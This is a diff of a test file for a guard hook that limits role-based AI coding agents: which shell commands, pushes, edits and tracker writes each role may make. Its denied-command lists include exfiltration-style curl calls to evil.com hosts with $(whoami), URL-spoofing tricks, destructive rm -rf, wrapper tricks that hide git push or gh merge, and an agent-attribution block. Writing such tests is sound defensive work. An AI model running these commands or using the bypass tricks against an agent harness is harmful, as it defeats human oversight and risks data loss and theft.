@@ -2,7 +2,7 @@ import assert from 'node:assert/strict';
 import { test } from 'node:test';
 import { evaluate } from '../scripts/guard-lib.mjs';
 
-const ctx = { branch: 'task/OAPP-12-fix-thing' };
+const ctx = { branch: 'task/APP-12-fix-thing', containerOnly: true, service: 'devcontainer' };
 const denied = (c) => assert.equal(evaluate(c, ctx).deny, true, c);
 const allowed = (c) => assert.equal(evaluate(c, ctx).deny, false, c);
 
@@ -10,23 +10,23 @@ test('merge, review and api writes are denied', () => {
 	denied('gh pr merge 12 --squash');
 	denied('gh pr review 12 --approve');
 	denied('gh pr ready 12');
-	denied('gh api -X POST repos/OlarmTech/olarm-system/merges');
+	denied('gh api -X POST repos/acme/app/merges');
 	denied('gh api repos/x/y --method DELETE');
 	allowed('gh pr view 12 --json state');
-	allowed('gh api repos/OlarmTech/olarm-system/pulls/12');
-	allowed('gh pr create --draft --title "Fix: x [OAPP-12]"');
+	allowed('gh api repos/acme/app/pulls/12');
+	allowed('gh pr create --draft --title "Fix: x [APP-12]"');
 	allowed('gh pr comment 12 --body-file body.md --attach ./shot.png#state');
 });
 
 test('only the ticket branch may be pushed', () => {
-	allowed('git push -u origin task/OAPP-12-fix-thing');
+	allowed('git push -u origin task/APP-12-fix-thing');
 	allowed('git push origin HEAD');
 	denied('git push origin HEAD:develop');
 	denied('git push origin develop');
 	denied('git push origin other-branch');
-	denied('git push --force origin task/OAPP-12-fix-thing');
-	denied('git push origin +task/OAPP-12-fix-thing');
-	denied('git push origin :task/OAPP-12-fix-thing');
+	denied('git push --force origin task/APP-12-fix-thing');
+	denied('git push origin +task/APP-12-fix-thing');
+	denied('git push origin :task/APP-12-fix-thing');
 });
 
 test('destructive git is denied', () => {
@@ -40,7 +40,7 @@ test('destructive git is denied', () => {
 test('commit hooks may be skipped', () => {
 	allowed('git commit -n -m x');
 	allowed('git commit -m x --no-verify');
-	allowed('git push --no-verify -u origin task/OAPP-12-fix-thing');
+	allowed('git push --no-verify -u origin task/APP-12-fix-thing');
 });
 
 test('chained commands are checked per segment', () => {
@@ -52,18 +52,19 @@ test('host installs and tests are denied, container execs are not', () => {
 	denied('npm ci');
 	denied('npx vitest run');
 	denied('GH=1 npm install lodash');
-	allowed('docker compose -p df-oapp-12 exec -T -u node devcontainer npx vitest run');
+	allowed('docker compose -p df-app-12 exec -T -u node devcontainer npx vitest run');
 	allowed('yarn --cwd clients/mobile install');
 });
 
-test('jira and docker prune are denied', () => {
-	denied('curl -s https://olarmtech.atlassian.net/rest/api/3/issue/OAPP-1');
+test('direct tracker access and docker prune are denied', () => {
+	denied('curl -s https://api.notion.com/v1/pages');
+	denied('curl -s https://example.atlassian.net/rest/api/3/issue/APP-1');
 	denied('docker system prune -af');
 	denied('docker volume prune -f');
 });
 
 test('a reviewer may read and record but not write, install or push', () => {
-	const r = (c) => evaluate(c, { role: 'reviewer', branch: 'task/OAPP-12-fix-thing' });
+	const r = (c) => evaluate(c, { role: 'reviewer', branch: 'task/APP-12-fix-thing' });
 	for (const ok of [
 		'git diff origin/develop...HEAD --stat',
 		'git log --oneline -5 && git show HEAD --stat',
@@ -93,7 +94,7 @@ test('a reviewer may read and record but not write, install or push', () => {
 import { evaluateEdit } from '../scripts/guard-lib.mjs';
 
 test('inside a run, factory files and run state are protected; own code and own cases are not', () => {
-	const run = { key: 'OAPP-12', role: 'builder' };
+	const run = { key: 'APP-12', role: 'builder' };
 	const e = (filePath, extra = {}) => evaluateEdit({ filePath, root: '/w', active: true, run, ...extra });
 	for (const bad of [
 		'dev-factory/scripts/guard-lib.mjs',
@@ -103,14 +104,14 @@ test('inside a run, factory files and run state are protected; own code and own 
 		'.dev-factory/review/abc-spec.json',
 		'.dev-factory/qa/run-1.json',
 		'.dev-factory/run.json',
-		'dev-factory/qa/cases/OAPP-99/x.yaml',
+		'.factory/qa/cases/APP-99/x.yaml',
 	]) {
 		assert.equal(e(bad).deny, true, bad);
 	}
 	for (const ok of [
 		'services/api/routes/a.js',
 		'clients/mobile/src/App.tsx',
-		'dev-factory/qa/cases/OAPP-12/login.yaml',
+		'.factory/qa/cases/APP-12/login.yaml',
 		'.dev-factory/build.done',
 		'.dev-factory/blocked.json',
 	]) {
@@ -128,11 +129,11 @@ test('outside a run only the vocabulary rule applies', () => {
 });
 
 test('shell writes to run state, records and factory code are denied; qa.mjs and reads are not', () => {
-	const ctx = { branch: 'task/OAPP-12-fix-thing' };
+	const ctx = { branch: 'task/APP-12-fix-thing', containerOnly: true, service: 'devcontainer' };
 	const d = (c) => assert.equal(evaluate(c, ctx).deny, true, c);
 	const a = (c) => assert.equal(evaluate(c, ctx).deny, false, c);
 	d('echo {} > .dev-factory/review/abc-spec.json');
-	d('cp /tmp/x.png .dev-factory/evidence/OAPP-12/run-1/a.png');
+	d('cp /tmp/x.png .dev-factory/evidence/APP-12/run-1/a.png');
 	d('sed -i s/a/b/ dev-factory/scripts/guard-lib.mjs');
 	d('rm -rf .dev-factory/qa');
 	d('echo x | tee .claude/settings.json');
@@ -140,13 +141,13 @@ test('shell writes to run state, records and factory code are denied; qa.mjs and
 	a('ls .dev-factory/review');
 	a('touch .dev-factory/build.done');
 	a(`node dev-factory/bin/qa.mjs record --run 1 --case a --status pass --assertion "banner visible" --screenshot /tmp/a.png`);
-	a('cat > dev-factory/qa/cases/OAPP-12/login.yaml');
+	a('cat > .factory/qa/cases/APP-12/login.yaml');
 });
 
 test('a read-only role may cd into the worktree but cd gives it no write path', () => {
 	const r = (c, role = 'reviewer') => evaluate(c, { role }).deny;
-	assert.equal(r('cd /Users/x/code/.worktrees/olarm-system/OAPP-1 && git diff origin/develop...HEAD --stat'), false);
-	assert.equal(r('cd ../.worktrees/OAPP-1 && node dev-factory/bin/qa.mjs review status'), false);
+	assert.equal(r('cd /Users/x/code/.worktrees/app/APP-1 && git diff origin/develop...HEAD --stat'), false);
+	assert.equal(r('cd ../.worktrees/APP-1 && node dev-factory/bin/qa.mjs review status'), false);
 	assert.equal(r('cd /Users/x/wt && git diff', 'debugger'), false);
 	assert.equal(r('cd /Users/x/wt && rm -rf services'), true);
 	assert.equal(r('cd /Users/x/wt && git push origin HEAD'), true);
@@ -158,26 +159,26 @@ test('debugger reads the ticket stack and records, nothing else', () => {
 		'git diff origin/develop...HEAD --stat',
 		'node dev-factory/bin/qa.mjs debug status',
 		'node dev-factory/bin/qa.mjs scrub --file /tmp/x.md',
-		'docker compose -f .devcontainer/docker-compose.yml -p df-OAPP-1 ps',
-		'docker compose -p df-OAPP-1 logs --tail 50 api',
-		'docker compose -f c.yml -p df-OAPP-1 exec -T devcontainer pm2 logs --nostream',
-		'docker compose -p df-OAPP-1 exec -T devcontainer pm2 jlist',
-		'curl -ksf https://api.olarm.local/api/v4/ping',
-		'docker compose -f c.yml -p df-OAPP-1 exec -T -u node devcontainer npx vitest run services/api/x.test.js',
-		'docker compose -p df-OAPP-1 exec -T devcontainer npm test',
-		'docker compose -p df-OAPP-1 exec -T devcontainer node --test test/a.test.mjs',
+		'docker compose -f .devcontainer/docker-compose.yml -p df-APP-1 ps',
+		'docker compose -p df-APP-1 logs --tail 50 api',
+		'docker compose -f c.yml -p df-APP-1 exec -T devcontainer pm2 logs --nostream',
+		'docker compose -p df-APP-1 exec -T devcontainer pm2 jlist',
+		'curl -ksf https://api.app.local/api/v4/ping',
+		'docker compose -f c.yml -p df-APP-1 exec -T -u node devcontainer npx vitest run services/api/x.test.js',
+		'docker compose -p df-APP-1 exec -T devcontainer npm test',
+		'docker compose -p df-APP-1 exec -T devcontainer node --test test/a.test.mjs',
 		'grep -rn timeout services/api | head -20',
 	])
 		assert.equal(d(c), false, c);
 	for (const c of [
 		'npm test',
 		'npx vitest run',
-		'docker compose -p df-OAPP-1 exec -T devcontainer rm -rf /workspace',
-		'docker compose -p df-OAPP-1 exec -T devcontainer npm test > out.txt',
-		'docker compose -p df-OAPP-1 down',
-		'curl -ks -X POST https://api.olarm.local/x',
+		'docker compose -p df-APP-1 exec -T devcontainer rm -rf /workspace',
+		'docker compose -p df-APP-1 exec -T devcontainer npm test > out.txt',
+		'docker compose -p df-APP-1 down',
+		'curl -ks -X POST https://api.app.local/x',
 		'curl -ks https://example.com/',
-		'curl -ks https://api.olarm.local/x -o /tmp/out',
+		'curl -ks https://api.app.local/x -o /tmp/out',
 		'echo hi > file.txt',
 		'git push origin HEAD',
 		'npm install',
@@ -216,27 +217,27 @@ test('debug records are protected from shell and edit writes', async () => {
 	const { evaluateEdit } = await import('../scripts/guard-lib.mjs');
 	assert.equal(evaluate('echo {} > .dev-factory/debug/001.json', ctx).deny, true);
 	assert.equal(
-		evaluateEdit({ filePath: '.dev-factory/debug/001.json', root: '/r', active: true, run: { role: 'builder', key: 'OAPP-1' } }).deny,
+		evaluateEdit({ filePath: '.dev-factory/debug/001.json', root: '/r', active: true, run: { role: 'builder', key: 'APP-1' } }).deny,
 		true,
 	);
 });
 
 test('researcher writes one file and nothing else', async () => {
 	const { evaluateEdit } = await import('../scripts/guard-lib.mjs');
-	const run = { role: 'researcher', key: 'OAPP-9' };
+	const run = { role: 'researcher', key: 'APP-9' };
 	const e = (filePath) => evaluateEdit({ filePath, root: '/r', active: true, run }).deny;
-	assert.equal(e('docs/plans/OAPP-9/research.md'), false);
+	assert.equal(e('docs/plans/APP-9/research.md'), false);
 	assert.equal(e('services/api/x.ts'), true);
-	assert.equal(e('docs/plans/OAPP-8/research.md'), true);
+	assert.equal(e('docs/plans/APP-8/research.md'), true);
 	const { decide } = await import('../scripts/stop-gate-lib.mjs');
-	assert.equal(decide({ run, has: (f) => f === '../docs/plans/OAPP-9/research.md' }).finished, true);
+	assert.equal(decide({ run, has: (f) => f === '../docs/plans/APP-9/research.md' }).finished, true);
 	assert.equal(decide({ run, has: () => false }).finished, false);
 });
 
 test('improver changes the factory but not what enforces it', async () => {
 	const { evaluateEdit } = await import('../scripts/guard-lib.mjs');
 	const { decide } = await import('../scripts/stop-gate-lib.mjs');
-	const run = { role: 'improver', key: 'OAPP-5', kind: 'improvement' };
+	const run = { role: 'improver', key: 'APP-5', kind: 'improvement' };
 	const e = (filePath) => evaluateEdit({ filePath, text: '', root: '/r', active: true, run }).deny;
 	assert.equal(e('dev-factory/skills/implement/SKILL.md'), false);
 	assert.equal(e('dev-factory/IMPROVEMENT-PLAN.md'), false);
@@ -254,21 +255,21 @@ test('improver changes the factory but not what enforces it', async () => {
 		assert.equal(e(f), true, f);
 	assert.equal(decide({ run, has: (f) => f === 'improve.done' }).finished, true);
 	assert.equal(decide({ run, has: () => false }).finished, false);
-	assert.equal(evaluate('git push origin ai-tooling/OAPP-5-x', { role: 'improver', branch: 'ai-tooling/OAPP-5-x' }).deny, false);
-	assert.equal(evaluate('git push origin develop', { role: 'improver', branch: 'ai-tooling/OAPP-5-x' }).deny, true);
+	assert.equal(evaluate('git push origin ai-tooling/APP-5-x', { role: 'improver', branch: 'ai-tooling/APP-5-x' }).deny, false);
+	assert.equal(evaluate('git push origin develop', { role: 'improver', branch: 'ai-tooling/APP-5-x' }).deny, true);
 	assert.equal(evaluate('gh pr merge 3', { role: 'improver' }).deny, true);
 });
 
 test('promoter edits only AGENTS.md files outside dev-factory and writes only through the edit tools', async () => {
 	const { evaluateEdit } = await import('../scripts/guard-lib.mjs');
 	const { decide } = await import('../scripts/stop-gate-lib.mjs');
-	const run = { role: 'promoter', key: 'OAPP-6' };
+	const run = { role: 'promoter', key: 'APP-6' };
 	const e = (filePath) => evaluateEdit({ filePath, text: '', root: '/r', active: true, run }).deny;
 	assert.equal(e('clients/mobile/AGENTS.md'), false);
 	assert.equal(e('AGENTS.md'), false);
 	for (const f of ['CLAUDE.md', '.cursor/rules/testing.mdc', 'dev-factory/AGENTS.md', 'services/api/x.ts']) assert.equal(e(f), true, f);
 	assert.equal(evaluate('echo x >> services/api/x.ts', { role: 'promoter' }).deny, true);
-	assert.equal(evaluate('git commit -m "Add rules [OAPP-6]"', { role: 'promoter' }).deny, false);
+	assert.equal(evaluate('git commit -m "Add rules [APP-6]"', { role: 'promoter' }).deny, false);
 	assert.equal(decide({ run, has: (f) => f === 'promote.done' }).finished, true);
 	assert.equal(decide({ run, has: () => false }).finished, false);
 });
@@ -276,7 +277,7 @@ test('promoter edits only AGENTS.md files outside dev-factory and writes only th
 test('every role may write its hand-off sentinel, none may write review or run state', async () => {
 	const { evaluateEdit } = await import('../scripts/guard-lib.mjs');
 	for (const role of ['reviewer', 'debugger', 'researcher', 'improver', 'promoter', 'builder']) {
-		const run = { role, key: 'OAPP-9' };
+		const run = { role, key: 'APP-9' };
 		const e = (filePath) => evaluateEdit({ filePath, root: '/r', active: true, run }).deny;
 		for (const f of ['blocked.json', 'improve.done', 'promote.done', 'needs_debug.json'])
 			assert.equal(e(`/r/.dev-factory/${f}`), false, `${role} ${f}`);
@@ -287,7 +288,7 @@ test('every role may write its hand-off sentinel, none may write review or run s
 	assert.equal(evaluate('echo {} > .dev-factory/review/x.json', { role: 'promoter' }).deny, true);
 });
 
-const builder = (c, extra = {}) => evaluate(c, { branch: 'feature/OAPP-1-x', role: 'builder', ...extra }).deny;
+const builder = (c, extra = {}) => evaluate(c, { branch: 'feature/APP-1-x', role: 'builder', containerOnly: true, ...extra }).deny;
 
 test('git is judged by its subcommand whatever global option or wrapper precedes it', () => {
 	for (const c of [
@@ -295,7 +296,7 @@ test('git is judged by its subcommand whatever global option or wrapper precedes
 		'git -C /tmp push --force origin develop',
 		'command git push --force origin main',
 		'/usr/bin/git push --force origin main',
-		'\\git push -f origin feature/OAPP-1-x',
+		'\\git push -f origin feature/APP-1-x',
 		'env GIT_TRACE=1 git push --force origin main',
 		'xargs -n 1 git push --force origin',
 		'nohup git push origin main',
@@ -307,16 +308,16 @@ test('git is judged by its subcommand whatever global option or wrapper precedes
 		"sh -c 'git push origin develop'",
 		'echo $(git push --force origin main)',
 		'echo `git push --force origin main`',
-		'git push origin feature/OAPP-1-x & git push --force origin main',
+		'git push origin feature/APP-1-x & git push --force origin main',
 	])
 		assert.equal(builder(c), true, c);
 	for (const c of [
 		'git -C /w status',
 		'git -C /w diff origin/develop...HEAD --stat',
-		'git -c advice.detachedHead=false checkout feature/OAPP-1-x',
+		'git -c advice.detachedHead=false checkout feature/APP-1-x',
 		'/usr/bin/git log --oneline -3',
 		'command git diff',
-		'git -C /w push -u origin feature/OAPP-1-x',
+		'git -C /w push -u origin feature/APP-1-x',
 		'cmd 2>&1 | tee /tmp/log',
 		'git commit -m "fix git push handling"',
 	])
@@ -331,8 +332,8 @@ test('with no ticket branch known (the scheduler itself) nothing is pushed', () 
 
 test('gh api with a body field, input or non-GET method is a write; wrappers and repo flags do not hide gh', () => {
 	for (const c of [
-		'gh api repos/OlarmTech/olarm-system/pulls/1/merge -f merge_method=squash',
-		'gh api repos/OlarmTech/olarm-system/pulls/1/reviews -f event=APPROVE -f body=lgtm',
+		'gh api repos/acme/app/pulls/1/merge -f merge_method=squash',
+		'gh api repos/acme/app/pulls/1/reviews -f event=APPROVE -f body=lgtm',
 		'gh api repos/x/y/pulls/1/reviews --input review.json',
 		'gh api repos/x/y/issues --raw-field title=x',
 		'gh api repos/x/y/issues --field title=x',
@@ -341,8 +342,8 @@ test('gh api with a body field, input or non-GET method is a write; wrappers and
 		'gh api graphql -f query=mutation',
 		'gh api --method=PUT repos/x/y/pulls/1/merge',
 		'gh api repos/x/y -X DELETE',
-		'gh -R OlarmTech/olarm-system pr merge 1',
-		'gh pr -R OlarmTech/olarm-system merge 1',
+		'gh -R acme/app pr merge 1',
+		'gh pr -R acme/app merge 1',
 		'gh --repo x/y pr review 1 --approve',
 		'command gh pr merge 1',
 		'gh alias set m "pr merge"',
@@ -350,10 +351,10 @@ test('gh api with a body field, input or non-GET method is a write; wrappers and
 	])
 		assert.equal(builder(c), true, c);
 	for (const c of [
-		'gh api repos/OlarmTech/olarm-system/pulls/12/comments --jq ".[] | .body"',
+		'gh api repos/acme/app/pulls/12/comments --jq ".[] | .body"',
 		'gh api --method GET repos/x/y/pulls/1',
 		'gh pr view 12 --json reviews',
-		'gh pr -R OlarmTech/olarm-system view 12',
+		'gh pr -R acme/app view 12',
 	])
 		assert.equal(builder(c), false, c);
 });
@@ -370,7 +371,7 @@ test('inline interpreter code is refused: the hook cannot see what it writes', (
 		`awk 'BEGIN{system("id")}'`,
 		'osascript -e "x"',
 		'eval "git push --force origin main"',
-		'docker compose -p df-OAPP-1 exec -T devcontainer node -e "x"',
+		'docker compose -p df-APP-1 exec -T devcontainer node -e "x"',
 		'echo x | python3 -c "import sys"',
 	])
 		assert.equal(builder(c), true, c);
@@ -378,11 +379,11 @@ test('inline interpreter code is refused: the hook cannot see what it writes', (
 		'node --test dev-factory/test/guard.test.mjs',
 		'node dev-factory/bin/qa.mjs show --run 1',
 		'python3 scripts/tool.py',
-		'docker compose -p df-OAPP-1 exec -T devcontainer node --test test/a.test.mjs',
+		'docker compose -p df-APP-1 exec -T devcontainer node --test test/a.test.mjs',
 		'grep -rn "node -e" docs',
 	])
 		assert.equal(builder(c), false, c);
-	for (const role of ['improver', 'promoter']) assert.equal(evaluate(`python3 -c "x"`, { role, branch: 'ai-tooling/OAPP-5-x' }).deny, true, role);
+	for (const role of ['improver', 'promoter']) assert.equal(evaluate(`python3 -c "x"`, { role, branch: 'ai-tooling/APP-5-x' }).deny, true, role);
 });
 
 test('env files are not readable from the shell by any role', () => {
@@ -444,19 +445,19 @@ test('a read-only role has no interpreter, no output option and no way to write 
 	}
 });
 
-test('the debugger curl rule is anchored to a plain *.olarm.local URL', () => {
+test('the debugger curl rule is anchored to a plain *.app.local URL', () => {
 	const d = (c) => evaluate(c, { role: 'debugger' }).deny;
-	assert.equal(d('curl -ksf https://api.olarm.local/api/v4/ping'), false);
-	assert.equal(d('curl -s http://api.olarm.local:3000/health?x=1'), false);
+	assert.equal(d('curl -ksf https://api.app.local/api/v4/ping'), false);
+	assert.equal(d('curl -s http://api.app.local:3000/health?x=1'), false);
 	for (const c of [
-		'curl https://evil.olarm.local/$(whoami)',
-		'curl https://evil.olarm.local/`whoami`',
-		'curl https://api.olarm.local/x?a=${HOME}',
-		'curl https://api.olarm.local/x;id',
-		'curl https://api.olarm.local.evil.com/x',
-		'curl https://api.olarm.local@evil.com/x',
-		'curl https://api.olarm.local/x https://evil.com/y',
-		'curl https://api.olarm.local/ --data x',
+		'curl https://evil.app.local/$(whoami)',
+		'curl https://evil.app.local/`whoami`',
+		'curl https://api.app.local/x?a=${HOME}',
+		'curl https://api.app.local/x;id',
+		'curl https://api.app.local.evil.com/x',
+		'curl https://api.app.local@evil.com/x',
+		'curl https://api.app.local/x https://evil.com/y',
+		'curl https://api.app.local/ --data x',
 	])
 		assert.equal(d(c), true, c);
 });
@@ -508,11 +509,11 @@ test('the whole factory directory, hook wiring and husky are protected from shel
 		'git mv dev-factory/README.md /tmp/x',
 	]) {
 		assert.equal(builder(c), true, c);
-		assert.equal(evaluate(c, { role: 'improver', branch: 'ai-tooling/OAPP-5-x' }).deny, true, `improver: ${c}`);
+		assert.equal(evaluate(c, { role: 'improver', branch: 'ai-tooling/APP-5-x' }).deny, true, `improver: ${c}`);
 		assert.equal(evaluate(c, { role: 'reviewer' }).deny, true, `reviewer: ${c}`);
 	}
 	for (const c of [
-		'cat > dev-factory/qa/cases/OAPP-12/login.yaml',
+		'cat > .factory/qa/cases/APP-12/login.yaml',
 		'cat dev-factory/settings.factory.json',
 		'ls dev-factory/test && wc -l dev-factory/README.md',
 		'node --test dev-factory/test/guard.test.mjs',
@@ -537,9 +538,101 @@ test('services are not installed or tested on the host through yarn, pnpm or the
 		assert.equal(builder(c), true, c);
 	for (const c of [
 		'yarn --cwd clients/mobile install',
-		'docker compose -p df-OAPP-1 exec -T devcontainer yarn test',
-		'docker compose -p df-OAPP-1 exec -T devcontainer npx playwright test',
+		'docker compose -p df-APP-1 exec -T devcontainer yarn test',
+		'docker compose -p df-APP-1 exec -T devcontainer npx playwright test',
 		'yarn prettier --check .',
 	])
 		assert.equal(builder(c), false, c);
+});
+
+test('host installs and tests are allowed when the repository has no container environment', () => {
+	const host = (c) => evaluate(c, { branch: 'task/APP-12-fix-thing', role: 'builder', containerOnly: false }).deny;
+	assert.equal(host('npm test'), false);
+	assert.equal(host('npx vitest run'), false);
+	assert.equal(host('yarn install'), false);
+	assert.equal(host('git push --force origin task/APP-12-fix-thing'), true, 'the rest of the guard still applies');
+});
+
+// ---- the person's own identity on every commit ----
+
+const own = (c, extra = {}) => evaluate(c, { branch: 'task/APP-12-fix-thing', role: 'builder', noAttribution: true, ...extra });
+
+test('commits and PRs carry no agent attribution while git.agentAttribution is false', () => {
+	for (const c of [
+		'git commit -m "Fix thing [APP-12]" -m "Co-Authored-By: Claude <noreply@anthropic.com>"',
+		'git commit -m "Fix thing\n\nCo-authored-by: someone <a@b.c>"',
+		'git commit --author="Claude <noreply@anthropic.com>" -m x',
+		'git commit --reset-author -m x',
+		'git commit --trailer "Co-authored-by: X <x@y.z>" -m x',
+		'GIT_AUTHOR_NAME=Claude git commit -m x',
+		'GIT_COMMITTER_EMAIL=noreply@anthropic.com git commit -m x',
+		'git config user.name Claude',
+		'git config --global user.email noreply@anthropic.com',
+		'git -c user.name=Claude commit -m x',
+		'gh pr create --title t --body "Generated with [Claude Code](https://claude.com/claude-code)"',
+		'gh pr edit 3 --body "Co-Authored-By: Claude"',
+	])
+		assert.equal(own(c).deny, true, c);
+	for (const c of [
+		'git commit -m "Fix thing [APP-12]"',
+		'git commit -n -m "Add export [APP-12]"',
+		'git config user.name',
+		'gh pr create --draft --title t --body-file body.md',
+	])
+		assert.equal(own(c).deny, false, c);
+});
+
+test('the attribution rules are off when a repository opts in, and for guards that were given no setting', () => {
+	assert.equal(own('git commit -m "x" -m "Co-Authored-By: Claude <noreply@anthropic.com>"', { noAttribution: false }).deny, false);
+	assert.equal(evaluate('git commit -m "x" -m "Co-Authored-By: Claude"', { branch: 'task/APP-12-fix-thing' }).deny, false);
+});
+
+// ---- running from the marketplace cache, with the tracker out of the agents' reach ----
+
+import { PLUGIN_ROOT } from '../scripts/plugin-root.mjs';
+
+test('the plugin qa.mjs is recognised by its own installed path, quoted or not, and no other file of that name is', () => {
+	const own = `node "${PLUGIN_ROOT}/bin/qa.mjs" scrub --file body.md`;
+	assert.equal(evaluate(own, { role: 'debugger', branch: 'task/APP-1-x' }).deny, false, own);
+	assert.equal(evaluate(`node ${PLUGIN_ROOT}/bin/qa.mjs debug status`, { role: 'debugger' }).deny, false);
+	assert.equal(
+		evaluate('node ./tools/bin/qa.mjs scrub --file body.md', { role: 'debugger' }).deny,
+		true,
+		'a script an agent wrote is not the plugin',
+	);
+	assert.equal(
+		evaluate(`node "${PLUGIN_ROOT}/bin/qa.mjs" record --run 1 --case a --status pass --assertion x --screenshot /tmp/a.png > .dev-factory/qa/x`, {
+			role: 'builder',
+		}).deny,
+		false,
+	);
+});
+
+test('a factory agent cannot write the task tracker, but the scheduler can', () => {
+	for (const role of ['builder', 'reviewer', 'debugger', 'researcher', 'improver', 'promoter']) {
+		for (const c of [
+			'gh issue comment 12 --body hi',
+			'gh issue close 12',
+			'gh issue edit 12 --add-label x',
+			'gh issue create --title t --body b',
+		]) {
+			assert.equal(evaluate(c, { role, branch: 'task/APP-1-x' }).deny, true, `${role}: ${c}`);
+		}
+	}
+	assert.equal(evaluate('gh issue view 12 --json body', { role: 'builder', branch: 'task/APP-1-x' }).deny, false, 'reading is fine');
+	assert.equal(evaluate('gh issue comment 12 --body hi', { branch: 'task/APP-1-x' }).deny, false, 'the scheduler has no agent role');
+	const tasks = (sub) => `node "${PLUGIN_ROOT}/scripts/tasks.mjs" ${sub}`;
+	assert.equal(evaluate(tasks('set-state TASK-1 done'), { role: 'builder', branch: 'task/APP-1-x' }).deny, true);
+	assert.equal(evaluate(tasks('comment TASK-1 --file c.txt'), { role: 'builder', branch: 'task/APP-1-x' }).deny, true);
+	assert.equal(evaluate(tasks('get TASK-1'), { role: 'builder', branch: 'task/APP-1-x' }).deny, false);
+	assert.equal(evaluate(tasks('set-state TASK-1 done'), { branch: 'task/APP-1-x' }).deny, false);
+});
+
+test('local task files and the installed plugin are not edited by a ticket', () => {
+	const e = (filePath) => evaluateEdit({ filePath, root: '/w', active: true, run: { role: 'builder', key: 'APP-1' } });
+	assert.equal(e('.factory/tasks/TASK-1-x.md').deny, true);
+	assert.equal(e('/Users/me/.claude/plugins/cache/dev-factory/dev-factory/0.2.0/scripts/guard-lib.mjs').deny, true);
+	assert.equal(e('.factory/qa/cases/APP-1/login.yaml').deny, false);
+	assert.equal(e('.factory/qa/cases/APP-2/login.yaml').deny, true, "another task's cases");
+	assert.equal(evaluate('echo x > .factory/tasks/TASK-1-x.md', { role: 'builder', branch: 'task/APP-1-x' }).deny, true);
 });
